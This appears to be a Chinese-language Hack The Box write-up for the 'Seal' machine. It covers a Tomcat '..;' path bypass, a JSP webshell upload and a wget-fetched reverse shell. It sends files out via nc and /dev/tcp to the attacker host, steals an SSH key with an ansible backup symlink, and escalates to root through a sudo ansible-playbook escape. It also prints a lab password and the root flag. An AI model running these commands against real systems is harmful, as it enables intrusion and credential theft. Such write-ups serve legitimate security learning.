@@ -1,0 +1,177 @@
+# Seal
+###### tags: `htb`
+> URL: https://app.hackthebox.eu/machines/Seal 
+
+IP : 10.10.10.250
+
+## Recon
+- 凡事都先從 掃 Port 開始
+    - `rustscan -a 10.10.10.250 -r 1-65535`
+        - ![](https://i.imgur.com/ttUAJY6.png)
+    - 找到 22 443 8080
+    - `nmap -A -p22,443,8080 10.10.10.250`
+        - ![](https://i.imgur.com/xbNLfKt.png)
+        - 443 : nginx 1.18
+- 觀察 443 的 HTTPS 憑證
+    - ![](https://i.imgur.com/GlMUdim.png)
+    - 網址應該是 `seal.htb`
+    - 加到 `/etc/hosts`
+        - `10.10.10.250 seal.htb`
+- 觀察首頁
+    - 443 port 
+        - ![](https://i.imgur.com/oeQnmMF.png)
+    - 8080 port
+        - ![](https://i.imgur.com/Fj9z7gv.png)
+        - 看起來是一個 Bit Bucket
+- 掃目錄
+    - `python3 dirsearch.py -u https://seal.htb/`
+    - ![](https://i.imgur.com/r7YSzQz.png)
+    - 發現有一些頁面 302 按進去又 404
+    - 而且首頁 nmap 明明就說是 nginx 這邊下面錯誤訊息卻跳 Tomcat
+        - ![](https://i.imgur.com/ZBJdb3i.png)
+            - apache tomcat 9.0.31 ?? 
+        - ![](https://i.imgur.com/8P1DPrw.png)
+            - nginx 1.18.0
+- 觀察 Bitbucket
+    - 發現可以註冊帳號
+        - ![](https://i.imgur.com/HcxyFnc.png)
+        - `meow` / `meow`
+        - ![](https://i.imgur.com/0Ny7NM5.png)
+    - 成功登入
+        - ![](https://i.imgur.com/Sw6zuao.png)
+        - 
+## Hack Tomcat
+- 可以發現原始碼與 Config 檔案都放在這邊
+    - ![](https://i.imgur.com/QH4iA2I.png)
+    - 在 commit log 中可以找到 tomcat 帳密
+        - ![](https://i.imgur.com/TKVUn3Y.png)
+        - `tomcat`
+        - `42MrHBf*z8{Z%`
+- 嘗試進入 Tomcat 後台，卻發現 403 
+    - https://seal.htb/admin/dashboard
+    - ![](https://i.imgur.com/mPoScme.png)
+- 但發現 Tomcat 的 Status 可以用
+    - https://seal.htb/manager/status/all
+    - ![](https://i.imgur.com/30ZnOf8.png)
+- 繼續翻 nginx 的 config
+    - 發現他針對 nginx 有設定一個 ssl_client_verify
+        - ![](https://i.imgur.com/O4sB5Vl.png)
+    - 這邊可以用 Orange 曾經介紹過的[手法](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) 
+        - 第 48 頁
+- 也就是網址透過 `..;` 截斷
+    - https://seal.htb/manager/status/..;/html
+    - 就成功進入湯姆貓後台ㄌ!!
+        - ![](https://i.imgur.com/GbIHIvS.png)
+- Tomcat 的後臺如果可以進入的話，代表可以上傳 jsp 的 webshell
+    - 這邊我採用這個
+        - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp
+    - `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp`
+    - `jar -cvf cmd.war cmd.jsp`
+    - ![](https://i.imgur.com/5gC826l.png)
+    - 然後在這邊上傳
+        - ![](https://i.imgur.com/4D4t6pZ.png)
+    - 上傳時仍然要注意 Bypass Path 的問題
+        - Post 的路徑要是 `POST /manager/status/..;/html/upload`
+        - 這邊我用 Burp 來處理
+        - ![](https://i.imgur.com/Pdn4u3g.png)
+- Web Shell 上傳成功
+    - ![](https://i.imgur.com/LtoHrRk.png)
+    - https://seal.htb/cmd/cmd.jsp
+    - ![](https://i.imgur.com/vZnET4C.png)
+    - 也可以亂輸入指令ㄌ
+        - ![](https://i.imgur.com/ZcRfen5.png)
+- 接下來準備 Reverse shell
+    - `wget 10.10.16.5:8000/s_HTB -O /tmp/s`
+        - ![](https://i.imgur.com/gXfTCmV.png)
+        - 確定真的有載到
+    - 準備 `nc -vlk 7877` 來接
+    - `bash /tmp/s`
+        - 成功收到!!
+        - ![](https://i.imgur.com/Oxmqxcm.png)
+## 提權
+- 發現 user flag 沒有權限
+    - ![](https://i.imgur.com/Jnpbv62.png)
+- 發現 `/var/www/keys` 裡面有一些 key
+    - 不管，先打包回家慢慢看
+    - ![](https://i.imgur.com/GGWkL27.png)
+    - `tar cvf /tmp/keys.tar .`
+    - ![](https://i.imgur.com/HIabUln.png)
+    - 用 nc 把檔案送回家
+        - ![](https://i.imgur.com/WQ9UlhD.png)
+        - ![](https://i.imgur.com/pB0KZjz.png)
+- 發現自簽憑證在裡面!
+    - ![](https://i.imgur.com/iqZ3nNG.png)
+    - `/var/www/keys/selfsigned-ca.crt;`
+- 那理論上我們可以用我們的瀏覽器綁自簽憑證ㄇ
+    - 依照這邊的方法
+        - https://www.jscape.com/blog/firefox-client-certificate
+    - ![](https://i.imgur.com/CsWztGO.png)
+    - QAQ 看起來是不行
+- 嘗試 Linpeas
+    - ![](https://i.imgur.com/QZI5bMG.png)
+    - ![](https://i.imgur.com/dLIe0kD.png)
+- 找到一個很新的備份檔案
+    - `/opt/backups/archives/backup-2021-08-14-09:44:35.gz`
+    - ![](https://i.imgur.com/lvDjHlj.png)
+    - ![](https://i.imgur.com/0drtpc6.png)
+
+- 觀察備份檔路徑，發現會備份
+    - `/var/lib/tomcat9/webapps/ROOT/admin/dashboard`
+    - ![](https://i.imgur.com/wxhkvBb.png)
+    - 是使用 `ansiple-playbook` 進行備份的
+        - 可以用 ps 觀察到
+        - ![](https://i.imgur.com/s9qxK5n.png)
+        - 他是用 `luis` 的權限執行的
+    - 這邊可以先注意一下 `copy link = yes`
+        - 等一下會運用到
+- 觀察 `ansible-playbook`
+    - `/usr/bin/ansible-playbook`
+    - 到 `/usr/bin`
+        - `ls -al | grep ansible-playbook`
+        - `ls -al | grep ansible`
+            - ![](https://i.imgur.com/GhQOmhL.png)
+            - 發現他會 link 到一個Python 檔案
+                - ![](https://i.imgur.com/XDs8mQg.png)
+            - 裡面滿複雜的，應該不會要去 Exploit 他ㄅQQ
+                - 而且相關目錄我們也都沒有權限
+- 開始通靈
+    - 發現使用者的家目錄有一個 `.ssh`
+        - ![](https://i.imgur.com/5Ke4grH.png)
+        - 猜他裡面可能有 `id_rsa` 可以偷
+        - 而  ansible-playbook 又可以備份 Link
+        - 所以我們可以把檔案 soft link 到備份的地方
+- 發現備份的目錄的 `uploads` 可寫
+    - ![](https://i.imgur.com/SE6ybm4.png)
+    - `ln -s /home/luis/.ssh/id_rsa id_rsa`
+        - ![](https://i.imgur.com/oCEWQAk.png)
+- 等待 30 秒產出新的備份檔案
+    - ![](https://i.imgur.com/GNIk1o8.png)
+    - 用 nc 帶回家
+        - `nc -l -p 1234 > backup.gz`
+        - `cat backup-2021-08-14-10:21:33.gz > /dev/tcp/10.10.16.5/1234`
+- 發現真的有 `id_rsa`
+    - ![](https://i.imgur.com/L8tbcv2.png)
+    - 是 OpenSSH 的 private key
+        - ![](https://i.imgur.com/owMnNYr.png)
+## 使用者提權
+- 使用 SSH 登入
+    - `ssh luis@seal.htb -i id_rsa`
+    - ![](https://i.imgur.com/ZsYnY63.png)
+- 取得 User Flag
+    - ![](https://i.imgur.com/dp9qz6j.png)
+- `sudo -l` 提權起手式
+    - ![](https://i.imgur.com/QfBwQMZ.png)
+    - 發現可以使用 ansible-playbook
+- GTFOBins 搜尋
+    - 找到了 ansible-playbook 提權方法
+        - https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo
+    - `TF=$(mktemp)`
+    - `echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF`
+    - `sudo ansible-playbook $TF`
+    - ![](https://i.imgur.com/W8tUtIO.png)
+- 取得 Root Flag
+    - ![](https://i.imgur.com/ku1ddc6.png)
+    - `b4890611a188410400d56e578f30979e`
+
+## 心得
+對於湯姆貓還是有一點陌生QQ，包含傳 jsp webshell 等部分，還有目錄截斷之類的也要多研究一下，這一題我覺得除了通靈 id_rsa 之外，整體來講題目滿好玩的！
